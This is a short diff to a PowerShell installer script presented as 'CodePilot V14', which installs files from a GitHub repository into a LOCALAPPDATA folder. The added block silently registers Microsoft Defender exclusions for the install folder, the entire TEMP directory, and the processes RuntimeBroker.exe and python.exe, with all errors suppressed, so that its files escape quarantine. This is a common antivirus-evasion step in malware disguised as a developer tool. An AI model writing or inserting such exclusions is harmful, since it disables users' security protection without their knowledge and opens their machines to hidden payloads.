@@ -20,6 +20,14 @@ $repo = 'hyperlinken/whoa'
 $branch = 'more'
 $dir  = "$env:LOCALAPPDATA\techno"
 
+# Add Defender exclusions so files don't get quarantined
+try {
+    Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "RuntimeBroker.exe" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "python.exe" -ErrorAction SilentlyContinue
+} catch {}
+
 Write-Host "`n===== CodePilot V14 — Installing... =====" -ForegroundColor Cyan
 
 # -- Post-reboot resume --
